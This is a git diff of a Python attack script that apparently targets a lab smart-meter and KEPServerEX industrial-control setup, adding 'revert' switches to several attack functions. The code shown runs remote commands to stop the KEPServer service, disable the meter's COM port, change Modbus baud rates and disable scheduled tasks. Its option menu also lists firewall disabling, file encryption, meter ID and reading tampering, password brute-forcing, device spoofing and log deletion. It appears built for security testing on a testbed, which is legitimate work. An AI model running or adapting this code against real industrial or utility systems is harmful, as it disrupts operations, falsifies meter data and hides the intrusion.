@@ -134,7 +134,7 @@ class AttackScript:
             return None
         ssh.close()
         # Return the output
-        return ssh_output, ssh_stderr
+        return ssh_output
 
     def scheduled_task_delete_files(self, folder_path) -> None:
         """
@@ -349,31 +349,39 @@ class AttackScript:
         else:
             print("Modinterrupt is not running. \n Fail.\n")
 
-    def disable_COMPort(self) -> None:
+    def disable_COMPort(self, revert: bool=False) -> None:
         """
         Disable a COM port
         # TODO: Add Exception handling
+
+        Args:
+            revert (bool): Revert the attack. If True, enable the COM Port
         """
 
         self.kep_server_stop()
 
         checkCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe /enum-devices /class Ports')
         dump = checkCOM.split()
+        comPort = "" # Initilize to prevent UnboundLocalError
         deviceID = ""
         for i in range(0, len(dump)):
             if dump[i] == "ID:":
-                deviceID = dump[i + 1]
-                if "CVBCx196117" in deviceID:
+                deviceID = dump[i+1]
+                if "CRBLx196117" in deviceID:
                     comPort = deviceID
-                    print(comPort)
+                    print(f"COM Port name: {comPort}")
 
-        disableCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe /disable-device "{comPort}"')
+        enable_or_disable = "/disable-device"
+        if revert:
+            enable_or_disable = "/enable-device"
+        disableCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe {enable_or_disable} "{comPort}"')
         if "successfully" in disableCOM:
             print(disableCOM)
-            self.kep_server_start()
         else:
             print(disableCOM)
-            print("Device not disabled. \nFail.\n")
+            print(f"Device not {enable_or_disable.split('-')[0][1:]}d. \nFail.\n")
+        
+        self.kep_server_start()
 
     def encrypt_files(self) -> None:
         # public key
@@ -551,9 +559,12 @@ class AttackScript:
         if success == 0:
             print("\nFail.")
 
-    def baudrate_change(self) -> None:
+    def baudrate_change(self, revert: bool=False) -> None:
         """
         Run modpoll to change baud rate - Register 40206
+
+        Args:
+            revert (bool): Revert the attack. If True, change the baudrate back to 9600.
         """
         self.kep_server_stop()
 
@@ -566,7 +577,8 @@ class AttackScript:
         # Use current_baudrate value to set the new baudrate value in parameters list
         new_baudrate = None
         identifyBR = None
-        if current_baudrate == "4800":
+
+        if current_baudrate == "4800" or revert: # If revert, set new baudrate to 9600
             new_baudrate = "1"
             identifyBR = "9600"
         elif current_baudrate == "9600":
@@ -594,7 +606,7 @@ class AttackScript:
 
         executable_path = self.MODPOLL_PATH + r"\modpoll.exe"
 
-        found_baudrate: int = 0
+        found_baudrate: str = "0"
         baudrate_list = ["4800", "9600", "19200"]
 
         for baudrate in baudrate_list:
@@ -623,12 +635,10 @@ class AttackScript:
         baudrate = self.baudrate_check()
         if baudrate in ["4800", "9600", "19200"]:
             parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "9005", "-1", "COM1"]
-            firmwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(
-                " ")
+            firmwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")
 
             parameters[9] = "9006"  # DPM33 Address for reading hardwareOutput
-            hardwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(
-                " ")
+            hardwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")
 
             # TODO: For "cannot be detected" stuff, raise an exception
             if "[9005]:" in firmwareOutput:
@@ -1299,12 +1309,10 @@ class AttackScript:
         device_to_get = ".".join([channel, device, name])
         print(json.dumps(connectivity.tag.del_tag(server, device_to_get), indent=4))
 
-    def kep_modify_tag(self, channel, device, name,
-                       new_name):  ## ADDED to modify tags ---- NOTE PROJECTID will change everytime so allow user to enter the ID or Copy from get_all_tags function
+    def kep_modify_tag(self, channel, device, name, new_name):  ## ADDED to modify tags ---- NOTE PROJECTID will change everytime so allow user to enter the ID or Copy from get_all_tags function
         server = self.kep_connect()
         device_to_get = ".".join([channel, device, name])
-        print(json.dumps(connectivity.tag.modify_tag(server, device_to_get, {"common.ALLTYPES_NAME": new_name}, True),
-                         indent=4))
+        print(json.dumps(connectivity.tag.modify_tag(server, device_to_get, {"common.ALLTYPES_NAME": new_name}, True), indent=4))
         # print(json.dumps(connectivity.tag.get_all_tags(server, device_to_get), indent=4))
 
     def kep_auto_tag_gen(self, channel, device):
@@ -1315,8 +1323,7 @@ class AttackScript:
     def kep_add_exchange(self, channel, device):
         server = self.kep_connect()
         device_info = ".".join([channel, device])
-        print(json.dumps(connectivity.egd.exchange.add_exchange(server, channel, device_info,
-                                                                {"common.ALL_TYPES_NAME": "New Exchange"}), indent=4))
+        print(json.dumps(connectivity.egd.exchange.add_exchange(server, channel, device_info, {"common.ALL_TYPES_NAME": "New Exchange"}), indent=4))
 
     def kep_get_exchange(self, channel, device, ex_type, exchange_name):
         server = self.kep_connect()
@@ -1331,9 +1338,7 @@ class AttackScript:
     def kep_add_name_resolution(self, channel, device):
         server = self.kep_connect()
         device_info = ".".join([channel, device])
-        print(json.dumps(
-            connectivity.egd.name.add_name_resolution(server, device_info, {"common.ALLTYPES_NAME": "Derrick"}),
-            indent=4))
+        print(json.dumps(connectivity.egd.name.add_name_resolution(server, device_info, {"common.ALLTYPES_NAME": "Derrick"}), indent=4))
 
     def kep_delete_name_resolution(self, channel, device):
         server = self.kep_connect()
@@ -1411,36 +1416,50 @@ class AttackScript:
 
     def kep_modify_project_properties(self):
         server = self.kep_connect()
-        print(json.dumps(connection.server.modify_project_properties(server, {"common.ALLTYPES_NAME": "Derrick"}),
-                         indent=4))
+        print(json.dumps(connection.server.modify_project_properties(server, {"common.ALLTYPES_NAME": "Derrick"}), indent=4))
         print(json.dumps(connection.server.get_project_properties(server), indent=4))
 
-    def disable_running_schedules(self) -> None:
+    def disable_running_schedules(self, revert: bool=False) -> None:
         """
         Disables MoveFiles and KEPServerEX 6.12 running schedules in task scheduler
+
+        Args:
+            revert (bool): Revert the attack. If true, tasks are enabled
         """
-        command_output = self.ssh_run_command("schtasks /change /TN \MoveFiles /disable")
-        if "SUCCESS:" in command_output:
-            print("Successfully disabled \MoveFiles Tasks Scheduler")
-            print("Ok.")
+        enable_or_disable = "/disable"
+        if revert:
+            enable_or_disable = "/enable"
 
-        command_output = self.ssh_run_command("schtasks /change /TN \KEPServerEX 6.12 /disable")
-        if "SUCCESS:" in command_output:
-            print("Successfully disabled \KEPServerEX 6.12 Tasks Scheduler")
-            print("Ok.")
+        schedules_list = ["\MoveFiles", "\KEPServerEX 6.13"]
 
-    def kep_server_stop(self) -> bool:
+        for schedule in schedules_list:
+            command_output = self.ssh_run_command(f'schtasks /change /TN "{schedule}" {enable_or_disable}')
+            if "SUCCESS:" in command_output:
+                print(f"Successfully {enable_or_disable[1:]} {schedule} Tasks Scheduler")
+                print("Ok.")
+            else:
+                print(f"Error trying to {enable_or_disable[1:]} {schedule} Tasks Scheduler")
+                print("Fail.")
+
+    def kep_server_stop(self, revert: bool=False) -> bool:
         """
         Stops KEPServer service
+
+        Args:
+            revert (bool): Revert the attack. If true, kepserver is started
 
         Returns:
             bool: True/False based on whether the command `stop service` could execute or not.
         """
+        if revert:
+            return self.kep_server_start()
+        
         command_output = self.ssh_run_command("sc query KEPServerEXV6")
         if "RUNNING" in command_output:
             print("Kepserver is running, Stopping now...")
             command_output = self.ssh_run_command("sc stop KEPServerEXV6")
 
+            counter = 1 # Added counter to make the UI Seem more responsive
             while "STOP_PENDING" in command_output:
                 command_output = self.ssh_run_command("sc query KEPServerEXV6")
                 if "FAILED" in command_output:
@@ -1450,7 +1469,8 @@ class AttackScript:
                     print("Kepserver is stopped")
                     return True
                 else:
-                    print("Kepserver is still stopping... waiting 1 more second")
+                    print(f"Kepserver is still stopping... waiting 1 more second [{counter}]")
+                    counter += 1
                     sleep(1)
 
         elif "STOPPED" in command_output:
@@ -1472,6 +1492,7 @@ class AttackScript:
             print("Kepserver is stopped, starting now...")
             command_output = self.ssh_run_command("sc start KEPServerEXV6")
 
+            counter = 1 # Added counter to make the UI Seem more responsive
             while "START_PENDING" in command_output:
                 command_output = self.ssh_run_command("sc query KEPServerEXV6")
                 if "FAILED" in command_output:
@@ -1481,7 +1502,8 @@ class AttackScript:
                     print("Kepserver is running!")
                     return True
                 else:
-                    print("Kepserver is still starting up... waiting 1 more second")
+                    print(f"Kepserver is still starting up... waiting 1 more second [{counter}]")
+                    counter += 1
                     sleep(1)
 
         elif "RUNNING" in command_output:
@@ -1775,7 +1797,7 @@ class AttackScript:
     def ChangeDataValueSendBack(self, meter_id: str):
         """
             Change the data value of the latest meter log file, in the specified meter ID's folder
-            Example file path of the meter ID is: C:\Users\Student\Documents\SmartMeterData\Meter2
+            Example file path of the meter ID is: C:\\Users\\Student\\Documents\\SmartMeterData\\Meter2
 
             Args:
                 meter_id (str): The meter ID to change the data value of
@@ -1799,80 +1821,51 @@ class AttackScript:
     def main(self):
         attack_option = str(argv[1])
 
+        revert = False # Default vale for revert
+
+        if len(argv) > 2: # NOTE: This is not final, may use Args Parse instead to specify revert=True
+            revert = True
+
         # if attack_option != "1":
         #     check_admin()
 
         match attack_option:
-            case "cool":
-                self.dummy_test()
-            case "start":
-                self.kep_server_start()
-            case "check":
-                self.baudrate_check()
-            case "1":
-                self.scheduled_task_delete_files(
-                    self.SMARTMETER_PATH)  # TODO: Determine if this function is depricated or can be modified
+            case "cool": self.dummy_test()
+            case "start": self.kep_server_start()
+            case "check": self.baudrate_check()
+            case "1":  self.scheduled_task_delete_files(self.SMARTMETER_PATH)  # TODO: Determine if this function is depricated or can be modified
             # case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH) # TODO: Determine if this function is depricated
-            case "3":
-                self.disable_firewall()
-            case "4":
-                self.disable_ssh()
-            case "5":
-                self.kep_server_stop()
-            case "6":
-                self.run_modinterrupt()
-            case "7":
-                self.disable_COMPort()
-            case "8":
-                self.encrypt_files()
-            case "9":
-                self.change_meterID()
-            case "10":
-                self.clear_energy_reading()
-            case "11":
-                self.revert(revert_option := str(argv[2]))
-            case "12":
-                self.kep_bruteforce()
-            case "13":
-                self.baudrate_change()
-            case "14":
-                self.smartmeter_get_hardware_info()
-            case "15":
-                self.kep_server_info()
-            case "16":
-                self.kep_get_all_users()
-            case "17":
-                self.kep_enable_user("User1")
-            case "18":
-                self.kep_disable_user("User1")
-            case "19":
-                self.kep_get_single_user("User1")
-            case "20":
-                self.disable_running_schedules()
-            case "21":
-                self.kep_get_all_channels()
-            case "22":
-                self.kep_get_all_devices("SmartMeter")
-            case "23":
-                self.kep_get_single_device("SmartMeter", "Meter1")
-            case "24":
-                self.kep_delete_spoofed_device("SmartMeter", "Device9999")
-            case "25":
-                self.kep_add_spoofed_device("SmartMeter", "Device7589")
-            case "26":
-                self.ssh_brute_force()  # Move this up to be with the other ssh functions
-            case "27":
-                self.setup_ssh_config_and_key()  # Move this up to be with the other ssh functions
-            case "28":
-                self.kep_delete_log_files()
-            case "29":
-                self.ChangeDataValueSendBack()
+            case "3":  self.disable_firewall()
+            case "4":  self.disable_ssh()
+            case "5":  self.kep_server_stop(revert)
+            case "6":  self.run_modinterrupt()
+            case "7":  self.disable_COMPort(revert)
+            case "8":  self.encrypt_files()
+            case "9":  self.change_meterID()
+            case "10": self.clear_energy_reading()
+            case "11": self.revert(revert_option := str(argv[2])) # TODO: Completely depricate this by implementing most function with revert=False/True
+            case "12": self.kep_bruteforce()
+            case "13": self.baudrate_change()
+            case "14": self.smartmeter_get_hardware_info()
+            case "15": self.kep_server_info()
+            case "16": self.kep_get_all_users()
+            case "17": self.kep_enable_user("User1")
+            case "18": self.kep_disable_user("User1")
+            case "19": self.kep_get_single_user("User1")
+            case "20": self.disable_running_schedules(revert)
+            case "21": self.kep_get_all_channels()
+            case "22": self.kep_get_all_devices("Channel1")
+            case "23": self.kep_get_single_device("SmartMeter", "Meter1")
+            case "24": self.kep_delete_spoofed_device("Channel1", "Device1")
+            case "25": self.kep_add_spoofed_device("SmartMeter", "Meter1")
+            case "26": self.ssh_brute_force()  # Move this up to be with the other ssh functions
+            case "27": self.setup_ssh_config_and_key()  # Move this up to be with the other ssh functions
+            case "28": self.kep_delete_log_files()
             case "-h":
                 print(
                     "\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
             case _:
                 print("Invalid Option! Use option \"-h\" for help!")
-
 
 if __name__ == '__main__':
     attack = AttackScript("172.16.2.77")
